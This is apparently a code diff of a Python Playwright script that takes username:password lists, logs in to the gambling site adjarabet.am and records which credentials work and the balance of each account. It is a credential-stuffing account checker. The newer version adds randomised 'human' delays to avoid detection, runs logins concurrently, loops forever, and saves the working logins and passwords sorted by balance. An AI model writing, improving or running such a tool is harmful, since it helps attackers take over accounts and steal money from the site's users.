@@ -1,603 +1,227 @@
 import asyncio
-import json
-import logging
-import os
-import re
-from dataclasses import dataclass, asdict
-from datetime import datetime
-from enum import Enum
-from pathlib import Path
-from typing import List
-from contextlib import asynccontextmanager
-
-import aiofiles
-import uvicorn
-from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
-from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import HTMLResponse
 from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout
+from typing import List
+import logging
+from datetime import datetime
+import random
+import json
+from pathlib import Path
+from dataclasses import dataclass
+from enum import Enum
+import aiofiles
+import re
 
-# =========================================================
-# CONFIG
-# =========================================================
-
-class Config:
-    HOST = os.getenv("HOST", "0.0.0.0")
-    PORT = int(os.getenv("PORT", 8000))
-
-    HEADLESS = os.getenv("HEADLESS", "true").lower() == "true"
-
-    TIMEOUT = int(os.getenv("TIMEOUT", 25000))
-
-    MAX_RETRIES = int(os.getenv("MAX_RETRIES", 2))
-
-    CONCURRENT_BROWSERS = int(os.getenv("CONCURRENT_BROWSERS", 2))
-
-    RESULTS_DIR = Path("results")
-    LOG_DIR = Path("logs")
-
-    RESULTS_DIR.mkdir(exist_ok=True)
-    LOG_DIR.mkdir(exist_ok=True)
-
-
-# =========================================================
-# LOGGER
-# =========================================================
-
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s | %(levelname)s | %(message)s",
-    handlers=[
-        logging.FileHandler("logs/bot.log", encoding="utf-8"),
-        logging.StreamHandler()
-    ]
-)
-
-logger = logging.getLogger("BOT")
-
-
-# =========================================================
-# MODELS
-# =========================================================
-
+# ================= ENUMS =================
 class AccountStatus(Enum):
     SUCCESS = "✅"
     FAILED = "❌"
     TIMEOUT = "⏰"
     BLOCKED = "🚫"
 
-
+# ================= DATA =================
 @dataclass
 class Account:
     username: str
     password: str
-    status: str = "❌"
-    balance: str = "0"
+    status: AccountStatus = AccountStatus.FAILED
+    balance: str = ""
     balance_value: float = 0.0
     error: str = ""
-    timestamp: str = ""
 
-    def __post_init__(self):
-        if not self.timestamp:
-            self.timestamp = datetime.now().isoformat()
+@dataclass
+class Config:
+    headless: bool = True
+    max_retries: int = 3
+    concurrency: int = 5
+    timeout: int = 15000
+    delay_min: float = 0.2
+    delay_max: float = 0.7
+    loop_delay: int = 10   # ⏱️ քանի վայրկյան սպասի ամբողջ ցիկլից հետո
 
-
-# =========================================================
-# WS MANAGER
-# =========================================================
-
-class WSManager:
+# ================= LOGGER =================
+class Logger:
     def __init__(self):
-        self.clients: List[WebSocket] = []
-        self.lock = asyncio.Lock()
+        self.logger = logging.getLogger("BOT")
+        if not self.logger.handlers:
+            self.logger.setLevel(logging.INFO)
 
-    async def connect(self, ws: WebSocket):
-        await ws.accept()
+            console = logging.StreamHandler()
+            file = logging.FileHandler("bot_log.txt")
 
-        async with self.lock:
-            self.clients.append(ws)
+            formatter = logging.Formatter("%(asctime)s | %(levelname)s | %(message)s")
+            console.setFormatter(formatter)
+            file.setFormatter(formatter)
 
-    async def disconnect(self, ws: WebSocket):
-        async with self.lock:
-            if ws in self.clients:
-                self.clients.remove(ws)
+            self.logger.addHandler(console)
+            self.logger.addHandler(file)
 
-    async def broadcast(self, message: str):
-        dead = []
+    def info(self, m): self.logger.info(m)
+    def error(self, m): self.logger.error(m)
+    def warn(self, m): self.logger.warning(m)
 
-        async with self.lock:
-            for ws in self.clients:
-                try:
-                    await ws.send_text(message)
-                except:
-                    dead.append(ws)
+# ================= ACCOUNT LOADER =================
+class AccountLoader:
+    def __init__(self, file="accounts.txt"):
+        self.file = Path(file)
 
-            for ws in dead:
-                if ws in self.clients:
-                    self.clients.remove(ws)
+    def load(self) -> List[Account]:
+        accs = []
+        if not self.file.exists():
+            print("accounts.txt not found")
+            return accs
 
+        for line in self.file.read_text(encoding="utf-8").splitlines():
+            if ":" in line:
+                u, p = line.split(":", 1)
+                accs.append(Account(u.strip(), p.strip()))
+        return accs
 
-manager = WSManager()
-
-
-# =========================================================
-# BOT
-# =========================================================
-
-class AdjarabetBot:
-    def __init__(self):
-        self.playwright = None
-        self.browser = None
-
-        self.running = False
-
-        self.results: List[Account] = []
-
-        self.semaphore = asyncio.Semaphore(
-            Config.CONCURRENT_BROWSERS
-        )
-
-        self.stats = {
-            "processed": 0,
-            "success": 0,
-            "failed": 0,
-            "timeout": 0
-        }
-
-    # =====================================================
-    # START
-    # =====================================================
-
-    async def start(self):
-        logger.info("Starting Playwright...")
-
-        self.playwright = await async_playwright().start()
-
-        self.browser = await self.playwright.chromium.launch(
-            headless=Config.HEADLESS,
-            args=[
-                "--disable-dev-shm-usage",
-                "--disable-gpu",
-                "--no-sandbox",
-                "--disable-setuid-sandbox"
-            ]
-        )
-
-        self.running = True
-
-        logger.info("Browser ready")
-
-    # =====================================================
-    # STOP
-    # =====================================================
-
-    async def stop(self):
-        logger.info("Stopping bot...")
-
-        self.running = False
-
-        try:
-            if self.browser:
-                await self.browser.close()
-        except Exception as e:
-            logger.error(e)
-
-        try:
-            if self.playwright:
-                await self.playwright.stop()
-        except Exception as e:
-            logger.error(e)
-
-        logger.info("Bot stopped")
-
-    # =====================================================
-    # SAVE RESULTS
-    # =====================================================
-
-    async def save_results(self):
-        try:
-            path = Config.RESULTS_DIR / "results.json"
-
-            async with aiofiles.open(
-                path,
-                "w",
-                encoding="utf-8"
-            ) as f:
-
-                await f.write(
-                    json.dumps(
-                        [asdict(x) for x in self.results],
-                        ensure_ascii=False,
-                        indent=2
-                    )
-                )
-
-        except Exception as e:
-            logger.error(f"Save error: {e}")
-
-    # =====================================================
-    # PARSE BALANCE
-    # =====================================================
-
-    def parse_balance(self, text: str) -> float:
-        try:
-            cleaned = text.replace(",", "")
-
-            match = re.search(
-                r"(\d+\.?\d*)",
-                cleaned
-            )
-
-            if match:
-                return float(match.group(1))
-
-        except:
-            pass
-
+# ================= UTILS =================
+def parse_balance(text: str) -> float:
+    try:
+        num = re.sub(r"[^\d.]", "", text)
+        return float(num) if num else 0.0
+    except:
         return 0.0
 
-    # =====================================================
-    # LOGIN
-    # =====================================================
+# ================= CORE BOT =================
+class Bot:
+    def __init__(self, config: Config):
+        self.cfg = config
+        self.log = Logger()
+        self.sem = asyncio.Semaphore(config.concurrency)
+        self.login_url = "https://www.adjarabet.am/hy"
+
+    async def start(self):
+        self.pw = await async_playwright().start()
+        self.browser = await self.pw.chromium.launch(headless=self.cfg.headless)
+
+    async def stop(self):
+        await self.browser.close()
+        await self.pw.stop()
+
+    async def human_delay(self):
+        await asyncio.sleep(random.uniform(self.cfg.delay_min, self.cfg.delay_max))
 
     async def login(self, account: Account):
-
-        async with self.semaphore:
-
-            for attempt in range(Config.MAX_RETRIES):
-
-                if not self.running:
-                    return
-
+        async with self.sem:
+            for attempt in range(self.cfg.max_retries):
                 context = None
-                page = None
-
                 try:
-                    context = await self.browser.new_context(
-                        viewport={
-                            "width": 1280,
-                            "height": 720
-                        },
-                        ignore_https_errors=True
-                    )
-
+                    context = await self.browser.new_context()
                     page = await context.new_page()
 
-                    page.set_default_timeout(
-                        Config.TIMEOUT
-                    )
+                    await page.goto(self.login_url, timeout=self.cfg.timeout)
 
-                    await page.goto(
-                        "https://www.adjarabet.am/hy",
-                        wait_until="domcontentloaded"
-                    )
+                    await page.fill('input[name="userIdentifier"]', account.username)
+                    await self.human_delay()
 
-                    await page.wait_for_selector(
-                        'input[name="userIdentifier"]',
-                        timeout=10000
-                    )
+                    await page.fill('input[type="password"]', account.password)
+                    await self.human_delay()
 
-                    await page.fill(
-                        'input[name="userIdentifier"]',
-                        account.username
-                    )
+                    await page.click('[data-test-id="header-login-button"]')
 
-                    await page.fill(
-                        'input[type="password"]',
-                        account.password
-                    )
+                    try:
+                        balance_el = await page.wait_for_selector(
+                            '[data-test-id="header-user-balance"]',
+                            timeout=self.cfg.timeout
+                        )
 
-                    await page.click(
-                        '[data-test-id="header-login-button"]'
-                    )
+                        balance_text = await balance_el.inner_text()
 
-                    await page.wait_for_selector(
-                        '[data-test-id="header-user-balance"]',
-                        timeout=15000
-                    )
+                        account.balance = balance_text
+                        account.balance_value = parse_balance(balance_text)
+                        account.status = AccountStatus.SUCCESS
 
-                    balance_el = await page.query_selector(
-                        '[data-test-id="header-user-balance"]'
-                    )
+                        self.log.info(f"✅ {account.username}:{account.password} | {balance_text}")
+                        return
 
-                    balance = await balance_el.inner_text()
-
-                    account.balance = balance
-                    account.balance_value = self.parse_balance(balance)
-                    account.status = AccountStatus.SUCCESS.value
-
-                    self.stats["success"] += 1
-
-                    logger.info(
-                        f"SUCCESS {account.username}"
-                    )
-
-                    break
-
-                except PlaywrightTimeout:
-                    account.status = AccountStatus.TIMEOUT.value
-                    account.error = "Timeout"
-
-                    self.stats["timeout"] += 1
-
-                    logger.warning(
-                        f"TIMEOUT {account.username}"
-                    )
+                    except PlaywrightTimeout:
+                        account.status = AccountStatus.TIMEOUT
+                        account.error = "Balance timeout"
 
                 except Exception as e:
-                    account.status = AccountStatus.FAILED.value
-                    account.error = str(e)[:120]
-
-                    self.stats["failed"] += 1
-
-                    logger.error(
-                        f"ERROR {account.username} | {e}"
-                    )
+                    account.error = str(e)
 
                 finally:
-                    try:
-                        if page:
-                            await page.close()
-                    except:
-                        pass
+                    if context:
+                        await context.close()
 
-                    try:
-                        if context:
-                            await context.close()
-                    except:
-                        pass
+                await asyncio.sleep(2 ** attempt)
 
-            self.results.append(account)
+            account.status = AccountStatus.FAILED
+            self.log.warn(f"❌ {account.username}:{account.password} FAILED")
 
-            self.stats["processed"] += 1
+    async def process_accounts(self):
+        loader = AccountLoader()
+        accounts = loader.load()
 
-            await self.save_results()
+        if not accounts:
+            self.log.warn("No accounts found")
+            return
 
-            await manager.broadcast(
-                "RESULT:" + json.dumps(
-                    asdict(account),
-                    ensure_ascii=False
+        self.log.info(f"Loaded {len(accounts)} accounts")
+
+        tasks = [self.login(acc) for acc in accounts]
+        await asyncio.gather(*tasks)
+
+        await self.save_results(accounts)
+        self.summary(accounts)
+
+    async def save_results(self, accounts: List[Account]):
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        sorted_accounts = sorted(accounts, key=lambda x: x.balance_value, reverse=True)
+
+        async with aiofiles.open("results.txt", "a", encoding="utf-8") as f:
+            await f.write(f"\n{'='*60}\n{timestamp}\n{'='*60}\n")
+            for acc in sorted_accounts:
+                await f.write(
+                    f"{acc.status.value} | {acc.username}:{acc.password} | {acc.balance} | {acc.error}\n"
                 )
-            )
 
-            await manager.broadcast(
-                f"PROGRESS:{self.stats['processed']}"
-            )
+        data = [
+            {
+                "username": acc.username,
+                "password": acc.password,
+                "balance": acc.balance,
+                "balance_value": acc.balance_value,
+                "status": acc.status.value,
+                "error": acc.error
+            }
+            for acc in sorted_accounts
+        ]
 
-    # =====================================================
-    # PROCESS
-    # =====================================================
+        async with aiofiles.open("results.json", "w", encoding="utf-8") as f:
+            await f.write(json.dumps(data, indent=2, ensure_ascii=False))
 
-    async def process(self, accounts: List[Account]):
+    def summary(self, accounts):
+        success = sum(1 for a in accounts if a.status == AccountStatus.SUCCESS)
+        total = len(accounts)
 
-        self.results.clear()
+        print("\n====== RESULT ======")
+        print(f"Success: {success}/{total}")
+        print(f"Rate: {success/total*100:.1f}%")
 
-        self.stats = {
-            "processed": 0,
-            "success": 0,
-            "failed": 0,
-            "timeout": 0
-        }
+# ================= MAIN LOOP =================
+async def main():
+    cfg = Config()
+    bot = Bot(cfg)
 
-        tasks = []
-
-        for acc in accounts:
-            tasks.append(
-                asyncio.create_task(
-                    self.login(acc)
-                )
-            )
-
-        await asyncio.gather(
-            *tasks,
-            return_exceptions=True
-        )
-
-        logger.info("Finished")
-
-
-bot = AdjarabetBot()
-
-
-# =========================================================
-# FASTAPI
-# =========================================================
-
-@asynccontextmanager
-async def lifespan(app: FastAPI):
     await bot.start()
 
-    yield
-
-    await bot.stop()
-
-
-app = FastAPI(
-    title="Adjarabet Bot",
-    version="13.0",
-    lifespan=lifespan
-)
-
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
-
-# =========================================================
-# HTML
-# =========================================================
-
-HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-<title>Adjarabet Bot</title>
-
-<style>
-
-body{
-background:#0d1117;
-color:white;
-font-family:Arial;
-padding:20px;
-}
-
-textarea{
-width:100%;
-height:250px;
-background:#161b22;
-color:white;
-padding:10px;
-border:none;
-outline:none;
-}
-
-button{
-padding:10px 20px;
-margin-top:10px;
-cursor:pointer;
-}
-
-#logs{
-margin-top:20px;
-height:300px;
-overflow:auto;
-background:#161b22;
-padding:10px;
-}
-
-</style>
-</head>
-
-<body>
-
-<h1>Adjarabet Bot v13</h1>
-
-<textarea id="accounts"></textarea>
-
-<br>
-
-<button onclick="startBot()">START</button>
-
-<div id="logs"></div>
-
-<script>
-
-let ws = new WebSocket(`ws://${location.host}/ws`)
-
-ws.onmessage = (e)=>{
-
-let logs = document.getElementById('logs')
-
-logs.innerHTML += `<div>${e.data}</div>`
-
-logs.scrollTop = logs.scrollHeight
-
-}
-
-async function startBot(){
-
-let data = document.getElementById('accounts').value
-
-await fetch('/start',{
-method:'POST',
-body:data
-})
-
-}
-
-</script>
-
-</body>
-</html>
-"""
-
-# =========================================================
-# ROUTES
-# =========================================================
-
-current_task = None
-
-
-@app.get("/")
-async def home():
-    return HTMLResponse(HTML)
-
-
-@app.post("/start")
-async def start(request: Request):
-
-    global current_task
-
-    body = await request.body()
-
-    text = body.decode("utf-8")
-
-    accounts = []
-
-    for line in text.splitlines():
-
-        line = line.strip()
-
-        if not line:
-            continue
-
-        if ":" not in line:
-            continue
-
-        username, password = line.split(":", 1)
-
-        accounts.append(
-            Account(
-                username=username.strip(),
-                password=password.strip()
-            )
-        )
-
-    if current_task and not current_task.done():
-        current_task.cancel()
-
-    current_task = asyncio.create_task(
-        bot.process(accounts)
-    )
-
-    return {
-        "status": "started",
-        "accounts": len(accounts)
-    }
-
-
-@app.get("/results")
-async def results():
-    return [asdict(x) for x in bot.results]
-
-
-@app.websocket("/ws")
-async def ws_endpoint(ws: WebSocket):
-
-    await manager.connect(ws)
-
     try:
-        while True:
-            await ws.receive_text()
+        while True:  # 🔥 ԱՆԸՆԴՀԱՏ ՑԻԿԼ
+            await bot.process_accounts()
 
-    except WebSocketDisconnect:
-        await manager.disconnect(ws)
+            print("\n🔄 Restarting cycle...\n")
+            await asyncio.sleep(cfg.loop_delay)
 
+    except KeyboardInterrupt:
+        print("\n⛔ Stopped by user")
 
-# =========================================================
-# MAIN
-# =========================================================
+    finally:
+        await bot.stop()
 
+# ================= RUN =================
 if __name__ == "__main__":
-
-    uvicorn.run(
-        app,
-        host=Config.HOST,
-        port=Config.PORT,
-        log_level="warning",
-        access_log=False
-    )
+    asyncio.run(main())
